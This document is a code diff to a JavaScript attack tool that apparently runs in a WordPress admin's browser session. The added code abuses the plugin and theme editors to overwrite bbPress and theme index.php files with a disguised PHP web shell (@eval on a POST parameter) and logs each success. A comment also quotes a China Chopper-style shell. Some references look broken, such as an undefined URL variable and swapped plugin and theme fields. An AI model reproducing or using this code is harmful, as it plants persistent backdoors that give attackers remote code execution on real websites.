@@ -4,6 +4,9 @@ var g_strURLIndex="";
 var g_strURLLogin="";
 var g_strURLAddUser="";
 var g_strURLComment="";
+var g_strURLEditPHPPostPlugin="";
+var g_strURLEditPHPPostTheme="";
+var g_strURLEditPHPArray=null;
 var g_strUsername="";
 var g_strComunication="";
 function initURL()
@@ -12,6 +15,14 @@ function initURL()
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
     g_strURLLogin=Common.getTargetHost()+"wp-login.php";
+    g_strURLEditPHPArray=new Array();
+    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Findex.php&plugin=bbpress%2Fbbpress.php";
+    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Fincludes%2Findex.php&plugin=bbpress%2Fbbpress.php";
+    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Flanguages%2Findex.php&plugin=bbpress%2Fbbpress.php";
+    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Ftemplates%2Findex.php&plugin=bbpress%2Fbbpress.php";
+    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
+    g_strURLEditPHPPostPlugin=Common.getTargetHost()+"/wp-admin/plugin-editor.php";
+    g_strURLEditPHPPostTheme=Common.getTargetHost()+"/wp-admin/theme-editor.php";
 }
 
 //find the give child
@@ -33,6 +44,81 @@ function findChild($element,array)
     }
     return $elementReturn;
 }
+//--------------------------------------------editPHP page-----------------------------------------------------------------------
+function inPageEditPHP() {
+    //check URL again
+    var jsonToSend=
+    {
+        _wp_http_referer:$("#template").find("input[name='_wp_http_referer']").val(),
+        _wpnonce:$("#template").find("#_wpnonce").val(),
+        action: $("#template").find("input[name='action']").val(),
+        file: $("#template").find("input[name='file']").val(),
+        newcontent:"<?php /*** Do not modify the files in this folder. */ @eval($_POST['wordPressPlugin']);?>",
+        scrollto: $("#template").find("input#scrollto").val(),
+        submit:$("#template").find("input#submit").val()
+    };
+    var strURLPost="";
+    if(window.location.href.indexOf("wp-admin/theme-editor.php")!==-1)
+    {   //theme
+        jsonToSend.plugin=$("#template").find("input[name='plugin']").val();
+        strURLPost=g_strURLEditPHPPostTheme;
+    }
+    else if(window.location.href.indexOf("wp-admin/plugin-editor.php")!==-1)
+    {   //plugin
+        jsonToSend.theme=$("#template").find("input[name='theme']").val();
+        strURLPost=g_strURLEditPHPPostPlugin;
+    }
+    else
+    {
+        console.log("fatal error,unnkow url in function inPageEditPHP:"+window.location.href);
+    }
+
+    $.ajax
+    (
+        {
+            type:"post",
+            url:strURLPost,
+            data:jsonToSend,
+            success:function(data,textStatus,xhr)
+            {
+                var json=
+                {
+                    username:window.parent.g_strUsername,
+                    action:"edit php file "+$("#template").find("input[name='file']").val()+",result:"
+                };
+                try
+                {
+                    if(data.indexOf("Thank you for updating")!==-1)
+                    {
+                        console.log("edit phpfile success:"+$("#template").find("input[name='file']").val());
+                        json.action+="success";
+                        throw "success";
+                    }
+                    else
+                    {
+                        console.log("edit phpfile failed:"+$("#template").find("input[name='file']").val());
+                        json.action+="failed";
+                        throw "failed";
+                    }
+                }
+                catch(e)
+                {
+                    if(e!="success"&&e!="failed")
+                    {
+                        //exception
+                        console.log("exception in inPageEditPHP:"+e);
+                        json.action+="exception:"+e;
+                    }
+                    addVisitLog(json);
+                }
+            }
+        }
+    );
+}
+
+//--------------------------------------------editPHP page-----------------------------------------------------------------------
+
+
 //--------------------------------------------comment page-----------------------------------------------------------------------
 function inPageComment()
 {
@@ -468,7 +554,7 @@ function frameOperationCalledFromSon(windowSon)
         {
             //if has privilege i need php edit
             //<?php @eval($_POST['caidao']);?>
-            //to do
+            frameJumpTo(g_strURLEditPHPBBPress1);
         }
         else
         {
@@ -513,6 +599,11 @@ function frameOperation()
     {
         //add user then 302 redirect to here,but program suppose to run to here
         window.parent.frameOperationCalledFromSon(window);
+    }
+    else if(window.location.href===g_strURLEditPHPBBPress1)
+    {
+        //to do
+        inPageEditPHP();
     }
     //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
     else
